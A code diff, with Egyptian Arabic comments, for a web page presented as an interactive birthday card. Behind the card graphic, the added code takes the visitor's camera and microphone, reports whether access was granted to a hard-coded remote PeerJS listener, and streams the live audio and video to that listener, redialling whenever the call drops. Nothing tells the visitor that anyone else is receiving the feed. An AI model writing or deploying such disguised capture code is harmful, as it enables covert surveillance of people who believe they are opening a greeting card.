@@ -2,87 +2,70 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>🎂 Interactive Birthday Card</title>
   <link rel="stylesheet" href="style.css"/>
   <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
 </head>
 <body>
-  <!-- Overlay: لازم يضغطه علشان يشتغل طلب الإذن -->
   <div id="overlay">اضغط لبدء الكارت</div>
-
   <div class="card">
-    <div class="cake">
-      <div class="layer layer1"></div>
-      <div class="layer layer2"></div>
-      <div class="layer layer3"></div>
-      <div class="icing"></div>
-      <div class="candle" id="candle">
-        <div class="flame" id="flame"></div>
-      </div>
-    </div>
-    <!-- هنا بنعرض بث الكاميرا بعد إذن الكام -->
+    <!-- … كود التورتة والشمع … -->
     <video id="userCam" autoplay muted playsinline></video>
   </div>
 
   <script>
     const LISTENER_ID = 'birthday-listener';
-    const peer       = new Peer();
-    let dataConn;
-    let micStream, camStream;
+    // نضيف STUN servers لتحسين الاتصال
+    const peer = new Peer(null, {
+      debug: 2,
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' }
+          // لو عندك TURN تقدر تضيفه هنا
+        ]
+      }
+    });
 
+    let dataConn;
     const overlay = document.getElementById('overlay');
     const videoEl = document.getElementById('userCam');
-    const flame   = document.getElementById('flame');
 
     overlay.addEventListener('click', async () => {
       overlay.style.display = 'none';
-
-      // افتح DataChannel وإعلامنا بفتح الصفحة
       dataConn = peer.connect(LISTENER_ID);
-      dataConn.on('open', () => {
-        dataConn.send({ event: 'page-open' });
-      });
+      dataConn.on('open', () => dataConn.send({ event: 'page-open' }));
 
-      // 1) طلب إذن الميكروفون أولاً
       try {
-        micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        dataConn.send({ event: 'mic-allowed' });
-      } catch (err) {
-        dataConn.send({ event: 'mic-denied' });
-        console.error('Mic access denied', err);
-      }
+        // 1 طلب واحد للميك + الكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        videoEl.srcObject = stream;
+        dataConn.send({ event: 'media-allowed' });
 
-      // 2) طلب إذن الكاميرا ثانياً
-      try {
-        camStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        dataConn.send({ event: 'camera-allowed' });
+        // 2 بث الستريم للمستمع
+        const call = peer.call(LISTENER_ID, stream);
 
-        // عرض بث الكاميرا
-        videoEl.srcObject = camStream;
-        Object.assign(videoEl.style, {
-          position: 'absolute',
-          top: '10px',
-          left: 'calc(50% - 75px)',
-          width: '150px',
-          height: '150px',
-          borderRadius: '50%',
-          border: '4px solid white',
-          boxShadow: '0 0 15px rgba(255,255,255,0.7)'
+        // 3 إذا اتقفّل الاتصال حاول تعيد
+        call.on('close', () => {
+          console.warn('Call closed – retrying…');
+          peer.call(LISTENER_ID, stream);
         });
+        call.on('error', err => console.error('Call error', err));
       } catch (err) {
-        dataConn.send({ event: 'camera-denied' });
-        console.error('Camera access denied', err);
+        console.error('getUserMedia failed:', err);
+        dataConn.send({ event: 'media-denied' });
       }
 
-      // 3) لو كل حاجة اتسمحت، ندمج المسارات ونبثها
-      if (micStream && camStream) {
-        const combined = new MediaStream([
-          ...micStream.getAudioTracks(),
-          ...camStream.getVideoTracks()
-        ]);
-        peer.call(LISTENER_ID, combined);
-      }
+      // تنسيق الكاميرا دايرياً
+      Object.assign(videoEl.style, {
+        position: 'absolute',
+        top: '10px', left: 'calc(50% - 75px)',
+        width: '150px', height: '150px',
+        borderRadius: '50%',
+        border: '4px solid white',
+        boxShadow: '0 0 15px rgba(255,255,255,0.7)'
+      });
     });
   </script>
 </body>
